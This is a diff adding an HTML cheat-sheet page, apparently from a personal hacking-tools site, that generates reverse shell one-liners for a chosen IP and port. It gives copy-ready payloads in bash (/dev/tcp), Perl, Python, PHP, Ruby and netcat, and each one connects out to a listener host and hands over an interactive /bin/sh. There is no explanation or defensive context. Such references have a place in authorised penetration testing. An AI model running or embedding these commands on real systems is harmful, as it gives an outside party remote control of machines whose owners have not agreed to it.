@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+
+        <link rel="icon" type="image/jpg" href="../Images/Rouge_Death_dp.jpg">
+        <title>Reverse Shells</title>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="../css/styles.css">
+
+    </head>
+
+    <body>
+
+        <div class="navbar">
+            <h1>Reverse Shells<span class="blink">|</span></h1>
+            <p>
+                <a class="other-links" href="../index.html">home</a> . 
+                <a class="other-links" href="../resources.html">tools and resources</a> . 
+                <a href="reverseshells.html"><u>Reverse Shells</u></a>
+            </p>
+            <button id="toggle" onclick="svg_changer()"></button>
+        </div>
+
+        <div id="input-form" class="flex-container">
+            <div class="flex-item in-form-field">
+                <label for="ip"><b>IP ADRR: </b></label>
+                <input class="field" type="text" name="ip" placeholder="10.10.20.1" autofocus />
+            </div>
+            <div class="flex-item in-form-field">
+                <label for="port"><b>PORT No: </b></label>
+                <input class="field" type="text" name="port" placeholder="4321" />
+            </div>
+            <div class="flex-item in-form-field"><button id="change-btn" onclick="change()">Change</button></div>
+        </div>
+
+        <!-- BASH -->
+        <div class="info">
+            <div class="sec">
+                <h2 class="sh-lang">BASH</h2>
+                <div class="payload payload-flex-container">
+                    <div class="pl-flex-item">
+                        <p id="bash" class="payload-ptext">bash -i >& /dev/tcp/<span class="lhost">10.0.0.1</span>/<span class="lport">8080</span> 0>&1</p>
+                    </div>
+                    <div class="pl-flex-item cp">
+                        <button id="bash-btn" class="cp-btn" onclick="clipboardCopy('#bash', 'bash-btn')">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="copy-ico" viewBox="0 0 20 20" fill="currentColor">
+                                <path d="M9 2a2 2 0 00-2 2v8a2 2 0 002 2h6a2 2 0 002-2V6.414A2 2 0 0016.414 5L14 2.586A2 2 0 0012.586 2H9z" />
+                                <path d="M3 8a2 2 0 012-2v10h8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PERL -->
+        <div class="info">
+            <div class="sec">
+                <h2 class="sh-lang">PERL</h2>
+                <div class="payload payload-flex-container">
+                    <div class="pl-flex-item" style="overflow-x:scroll;">
+                        <p id="perl">perl -e 'use Socket;$i="<span class="lhost">10.0.0.1</span>";$p=<span class="lport">1234</span>; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};'</p>
+                    </div>
+                    <div class="pl-flex-item cp">
+                        <button id="perl-btn" class="cp-btn" onclick="clipboardCopy('#perl', 'perl-btn')">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="copy-ico" viewBox="0 0 20 20" fill="currentColor">
+                                <path d="M9 2a2 2 0 00-2 2v8a2 2 0 002 2h6a2 2 0 002-2V6.414A2 2 0 0016.414 5L14 2.586A2 2 0 0012.586 2H9z" />
+                                <path d="M3 8a2 2 0 012-2v10h8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PYTHON -->
+        <div class="info">
+            <div class="sec">
+                <h2 class="sh-lang">PYTHON</h2>
+                <div class="payload payload-flex-container">
+                    <div class="pl-flex-item" style="overflow-x:scroll;">
+                        <p id="python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span class="lhost">10.0.0.1</span>",<span class="lport">1234</span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</p>
+                    </div>
+                    <div class="pl-flex-item cp">
+                        <button id="python-btn" class="cp-btn" onclick="clipboardCopy('#python', 'python-btn')">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="copy-ico" viewBox="0 0 20 20" fill="currentColor">
+                                <path d="M9 2a2 2 0 00-2 2v8a2 2 0 002 2h6a2 2 0 002-2V6.414A2 2 0 0016.414 5L14 2.586A2 2 0 0012.586 2H9z" />
+                                <path d="M3 8a2 2 0 012-2v10h8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PHP -->
+        <div class="info">
+            <div class="sec">
+                <h2 class="sh-lang">PHP</h2>
+                <div class="payload payload-flex-container">
+                    <div class="pl-flex-item" style="overflow-x:scroll;">
+                        <p id="php">php -r '$sock=fsockopen("<span class="lhost">10.0.0.1</span>",<span class="lport">1234</span>);exec("/bin/sh -i <&3 >&3 2>&3");'</p>
+                    </div>
+                    <div class="pl-flex-item cp">
+                        <button id="php-btn" class="cp-btn" onclick="clipboardCopy('#php', 'php-btn')">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="copy-ico" viewBox="0 0 20 20" fill="currentColor">
+                                <path d="M9 2a2 2 0 00-2 2v8a2 2 0 002 2h6a2 2 0 002-2V6.414A2 2 0 0016.414 5L14 2.586A2 2 0 0012.586 2H9z" />
+                                <path d="M3 8a2 2 0 012-2v10h8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- RUBY -->
+        <div class="info">
+            <div class="sec">
+                <h2 class="sh-lang">RUBY</h2>
+                <div class="payload payload-flex-container">
+                    <div class="pl-flex-item" style="overflow-x:scroll;">
+                        <p id="ruby">ruby -rsocket -e'f=TCPSocket.open("<span class="lhost">10.0.0.1</span>",<span class="lport">1234</span>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</p>
+                    </div>
+                    <div class="pl-flex-item cp">
+                        <button id="ruby-btn" class="cp-btn" onclick="clipboardCopy('#ruby', 'ruby-btn')">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="copy-ico" viewBox="0 0 20 20" fill="currentColor">
+                                <path d="M9 2a2 2 0 00-2 2v8a2 2 0 002 2h6a2 2 0 002-2V6.414A2 2 0 0016.414 5L14 2.586A2 2 0 0012.586 2H9z" />
+                                <path d="M3 8a2 2 0 012-2v10h8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- NETCAT -->
+        <div class="info">
+            <div class="sec">
+                <h2 class="sh-lang">NETCAT</h2>
+                <div class="payload payload-flex-container">
+                    <div class="pl-flex-item" style="overflow-x:scroll;">
+                        <p id="nc1">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <span class="lhost">10.0.0.1</span> <span class="lport">1234</span> >/tmp/f</p>
+                    </div>
+                    <div class="pl-flex-item cp">
+                        <button id="nc1-btn" class="cp-btn" onclick="clipboardCopy('#nc1', 'nc1-btn')">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="copy-ico" viewBox="0 0 20 20" fill="currentColor">
+                                <path d="M9 2a2 2 0 00-2 2v8a2 2 0 002 2h6a2 2 0 002-2V6.414A2 2 0 0016.414 5L14 2.586A2 2 0 0012.586 2H9z" />
+                                <path d="M3 8a2 2 0 012-2v10h8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="payload payload-flex-container">
+                    <div class="pl-flex-item" style="overflow-x:scroll;">
+                        <p id="nc2">nc -e /bin/sh <span class="lhost">10.0.0.1</span> <span class="lport">1234</span></p>
+                    </div>
+                    <div class="pl-flex-item cp">
+                        <button id="nc2-btn" class="cp-btn" onclick="clipboardCopy('#nc2', 'nc2-btn')">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="copy-ico" viewBox="0 0 20 20" fill="currentColor">
+                                <path d="M9 2a2 2 0 00-2 2v8a2 2 0 002 2h6a2 2 0 002-2V6.414A2 2 0 0016.414 5L14 2.586A2 2 0 0012.586 2H9z" />
+                                <path d="M3 8a2 2 0 012-2v10h8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <script src="../js/themes.js"></script>
+        <script src="../js/configure.js"></script>
+        <script src="../js/clip.js"></script>
+
+    </body>
+
+</html>
